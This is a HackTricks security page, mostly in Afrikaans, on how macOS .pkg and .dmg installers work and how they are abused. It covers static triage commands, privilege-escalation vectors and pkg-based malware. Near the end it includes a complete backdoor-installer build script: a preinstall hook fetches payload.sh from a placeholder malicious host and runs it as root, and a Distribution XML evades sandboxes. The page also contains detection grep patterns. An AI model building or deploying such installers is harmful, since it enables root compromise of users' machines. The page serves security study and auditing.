# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basiese Inligting

’n macOS **installer package** (ook bekend as ’n `.pkg`-lêer) is ’n lêerformaat wat deur macOS gebruik word om sagteware te **versprei**. Hierdie lêers is soos ’n **boks wat alles bevat wat ’n stuk sagteware** nodig het om korrek te installeer en te loop.

Die package-lêer self is ’n argief wat ’n **hiërargie van lêers en directories bevat wat op die teiken** rekenaar geïnstalleer sal word. Dit kan ook **scripts** insluit om take uit te voer voor en na die installasie, soos om configuration files op te stel of ou weergawes van die sagteware skoon te maak.

### Hiërargie

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Aanpassings (title, welcome text…) en script/installasie-kontroles
- **PackageInfo (xml)**: Info, install requirements, install location, paths na scripts om uit te voer
- **Bill of materials (bom)**: Lys van lêers om te installeer, op te dateer of te verwyder met file permissions
- **Payload (CPIO archive gzip compressed)**: Lêers om in die `install-location` vanaf PackageInfo te installeer
- **Scripts (CPIO archive gzip compressed)**: Pre en post install scripts en meer resources wat na ’n temp directory onttrek word vir uitvoering.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Om die inhoud van die installer te visualiseer sonder om dit handmatig te dekomprimeer, kan jy ook die gratis hulpmiddel [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) gebruik.

### Static triage shortcuts

As die doel ontleding is, probeer om **te vermy om die package eers met `Installer.app` oop te maak**. Sommige packages kan code uitvoer sodra Installer hulle oopmaak (byvoorbeeld via `system.run()` of installer plug-ins), so offline extraction is gewoonlik die veiliger beginpunt.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG Basiese Inligting

DMG-lêers, of Apple Disk Images, is 'n lêerformaat wat deur Apple se macOS gebruik word vir skyfbeelde. 'n DMG-lêer is in wese 'n **mountable disk image** (dit bevat sy eie filesystem) wat rou blokdata bevat, tipies gekomprimeer en soms geïnkripteer. Wanneer jy 'n DMG-lêer oopmaak, **mount** macOS dit asof dit 'n fisiese skyf is, wat jou toelaat om toegang tot die inhoud te kry.

> [!CAUTION]
> Let daarop dat **`.dmg`** installers **so baie formate** ondersteun dat sommige in die verlede wat vulnerabilities bevat het, misbruik is om **kernel code execution** te verkry.

### Hierargie

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Die hierargie van 'n DMG-lêer kan verskil op grond van die inhoud. Vir application DMGs volg dit egter gewoonlik hierdie struktuur:

- Top Level: Dit is die root van die disk image. Dit bevat dikwels die application en moontlik 'n skakel na die Applications-folder.
- Application (.app): Dit is die werklike application. In macOS is 'n application tipies 'n package wat baie individuele lêers en folders bevat wat die application uitmaak.
- Applications Link: Dit is 'n shortcut na die Applications-folder in macOS. Die doel hiervan is om dit vir jou maklik te maak om die application te install. Jy kan die .app-lêer na hierdie shortcut sleep om die app te install.

## Privesc via pkg abuse

### Execution from public directories

As 'n pre of post installation script byvoorbeeld vanaf **`/var/tmp/Installerutil`** execute, en 'n attacker kan daardie script control, kan hulle privileges escalate wanneer dit uitgevoer word. Of 'n ander soortgelyke voorbeeld:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Dit is 'n [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) wat verskeie installers en updaters sal call om **iets as root uit te voer**. Hierdie function aanvaar die **path** van die **file** om uit te voer as parameter, maar as 'n attacker hierdie file kan **modify**, sal hy in staat wees om die uitvoering daarvan met root te **abuse** om **privileges te escalate**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Vir meer inligting, kyk na hierdie praatjie: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Omgewing en shebang-misbruik

Moderne PackageKit-bugs het gewys dat installer-skripte dikwels uitgevoer word as **trusted root code** terwyl attacker-controlled konteks steeds naby gehou word. Wanneer vendor packages geoudit word, gee spesiale aandag aan:

- Shell interpreters soos `#!/bin/zsh` / `#!/bin/bash`
- Calls soos `sudo -u $USER`, `launchctl asuser`, of enige logic wat `$USER`, `$HOME`, `PATH`, `TMPDIR`, of relative paths vertrou
- Non-shell interpreters wat user-controlled init files of libraries kan laai
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Vir die 2024 PackageKit root-environment bug (`~/.zshenv` / `~/.bash*` inheritance during user-initiated installs), kyk na [the generic macOS privesc page](../macos-privilege-escalation.md). As die package **Apple-signed** is, kan dieselfde script bug **SIP/TCC-relevant** word omdat `system_installd` dalk `com.apple.rootless.install.heritable` dra; sien [the SIP page](../macos-security-protections/macos-sip.md).

### Execution by mounting

As 'n installer skryf na `/tmp/fixedname/bla/bla`, is dit moontlik om **'n mount** oor `/tmp/fixedname` te skep met noowners sodat jy **enige file tydens die installation kan modify** om die installation process te abuse.

'n Voorbeeld hiervan is **CVE-2021-26089** wat daarin geslaag het om **'n periodic script te overwrite** om execution as root te kry. Vir meer inligting kyk na die praatjie: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

Dit is moontlik om net 'n **`.pkg`** file te genereer met **pre en post-install scripts** sonder enige werklike payload behalwe die malware binne-in die scripts.

### JS in Distribution xml

Dit is moontlik om **`<script>`** tags by te voeg in die **distribution xml** file van die package en daardie code sal uitgevoer word en dit kan **commands execute** met behulp van **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

In distribution packages hang dit gewoonlik af van die top-level `Distribution` file wat external scripts aktiveer, byvoorbeeld met `allow-external-scripts="true"`. Daarom is om net `preinstall` / `postinstall` te review nie genoeg nie: die **Distribution XML self** kan `installation-check` / `volume-check` hooks en direkte `system.run()` / `system.runOnce()` execution paths bevat.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Agterdeure-installeerder

Kwaadwillige installeerder wat 'n script en JS-kode binne dist.xml gebruik
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Verwysings

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
